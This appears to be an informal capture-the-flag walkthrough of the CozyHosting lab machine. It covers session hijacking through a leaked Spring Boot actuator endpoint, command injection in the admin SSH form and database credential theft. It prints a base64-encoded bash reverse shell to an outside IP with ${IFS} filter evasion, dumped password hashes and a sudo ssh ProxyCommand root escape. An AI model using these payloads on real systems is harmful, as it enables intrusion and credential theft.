Started with a nmap
```
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
1111/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.12)
|_http-title: Directory listing for /

```

Added the domain to /etc/hosts and were going to look at the webserver 

Did test the login page for sqli

The web server is running spring boot maybe dirsearch for that
Found a link to a potential leaking endpoint with nuclei
```
http://cozyhosting.htb/actuator
```
Under the sessions link it has one session looks the same as the cookie from the website
```
http://cozyhosting.htb/actuator/sessions
{"837825705F2720DA6BDBAC783C2C7DA8":"kanderson"}
```
After a little bit I got the session cookie to bypass me to the admin page
```
{"0AAC822F8C9EE0A71FE2118D0D213164":"UNAUTHORIZED",
"47F306D16B4770949F87E28AEDD86BBE":"UNAUTHORIZED",
"952D333BBAAA2A7EC0143B431AF292DD":"kanderson","
A26B51B6CA680DF9F714C3EE7F726691":"UNAUTHORIZED",
"85FC6BCAB2A310DDBF16611AF35756D7":"UNAUTHORIZED",
"141C5AC4B9C428DFCE65EC3C1B93BAAA":"kanderson"}
```
The main admin page has a .ssh keys section we add a random hostname and capture it in burp and it gives a ssh error when i have it a username as well says it cant make the bash terminal so were going to try and put a payload in there 
First we going to encode this base64
```
echo "bash -i >& /dev/tcp/10.10.14.152/1234 0>&1" | base64 -w 0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTIvMTIzNCAwPiYxCg==

;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNTIvMTIzNCAwPiYxCg=="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;

```
After messing with the encoding for a while got it to call back to me have to url encode key char

After we got loged in I found a jar file
open file with jd-gui 
found a cred in the file
```
spring.datasource.driver-class-name=org.postgresql.Driver  
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect  
spring.jpa.hibernate.ddl-auto=none  
spring.jpa.database=POSTGRESQL  
spring.datasource.platform=postgres  
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting  
spring.datasource.username=postgres  
spring.datasource.password=Vg&nvzAQ7XxR
```
Connecting to the db
```
psql -h 127.0.0.1 -U postgres
psql -h 127.0.0.1 -U postgres
Password for user postgres: Vg&nvzAQ7XxR
```

```
\c cozyhosting
\d
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)

select * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```
After cracking the hashes we can now connect to the ssh useing josh 
```
josh:manchesterunited
```
I ran sudo -l and looks like we can run ssh as root
```
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```
With this command we got root
```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```
